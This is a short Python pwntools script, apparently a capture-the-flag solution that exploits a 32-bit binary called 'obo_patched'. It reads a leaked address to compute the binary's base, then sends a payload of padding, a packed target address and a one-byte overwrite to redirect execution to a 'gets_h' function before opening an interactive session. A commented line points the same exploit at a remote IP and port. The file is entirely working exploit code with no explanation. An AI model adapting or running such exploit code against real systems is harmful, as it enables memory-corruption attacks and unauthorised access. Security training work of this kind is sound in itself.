#!/usr/bin/env python3

from pwn import *

exe = ELF("./obo_patched", checksec = False)
libc = ELF("./libc.so.6", checksec = False)
ld = ELF("./ld-linux.so.2", checksec = False)

context.binary = exe
p = process(exe.path)
# p = remote("188.166.252.88", 13373)

### LEAK LIBC ###
p.recvuntil(b'FYI: ')
fyi = p.recv(10)
exe.base = int(fyi,16) - exe.sym.init
log.info('Binary Base: ' + hex(exe.base))

### GET FLAG ###
flag = exe.sym.gets_h + exe.base
payload = b'A' * 12 + p32(flag) +b'\x80'
p.sendlineafter(b'2024: ', payload)

p.interactive()

